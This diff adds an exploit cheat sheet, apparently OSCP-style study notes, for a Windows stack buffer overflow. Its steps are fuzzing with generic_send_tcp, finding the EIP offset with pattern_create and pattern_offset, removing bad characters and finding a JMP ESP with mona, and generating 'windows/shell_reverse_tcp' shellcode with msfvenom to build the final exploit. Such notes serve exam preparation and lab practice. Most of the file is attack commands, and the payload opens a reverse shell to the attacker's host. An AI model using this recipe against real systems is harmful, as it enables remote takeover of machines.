@@ -1,0 +1,43 @@
+[Launch a spike to the binary using generic_send_tcp to check for overflow quickly]
+generic_send_tcp <ip> <port> <config> 0 0
+
+[Launch a fuzzer to figure out how many bytes will it take to overflow the buffer]
+
+[Create a pattern using pattern_create to quickly check the offset of the EIP]
+/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <bytes from the fuzzer + 400>
+
+
+[Find the offset using pattern_offset]
+/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l <generated-bytes-from-pattern-create> -q <EIP value> 
+
+[Set the directory of mona]
+!mona config -set workingfolder c:\mona\%p
+
+[Generate a byte array with mona and exclude the following bad char]
+!mona bytearray -b "\x00\x<bad char>"
+// Restart the process and launch the badchar.py script
+// Identify the bad chars and remove it one by one from the script 
+// Generate a new byte array and exclude the badchars one by one
+// Repeat the process
+
+[Compare the ESP address to the bytearray]
+!mona compare -f C:\mona\oscp\bytearray.bin -a <esp address>
+
+
+[Jump to the addresses that doesn't include the bad characters]
+!mona jmp -r esp -cpb "\x00\<bad char>"
+
+[Get the first address in the results and then convert it into hex]
+625011AF => \xAF\x11\x05\x62
+
+[Generate a shellcode using msfvenom]
+msfvenom -p windows/shell_reverse_tcp LHOST=<LHOST> LPORT=4444 EXITFUNC=thread -b "<bad-chars>" -f c
+
+
+[Configure the exploit]
+assign offset the offset of the EIP
+assign retn the hex value of the address
+retn = "\xAF\x11\x05\x62"
+assign payload the shellcode generated using msfvenom
+
+https://x3tb3t.github.io/2018/03/29/mona/
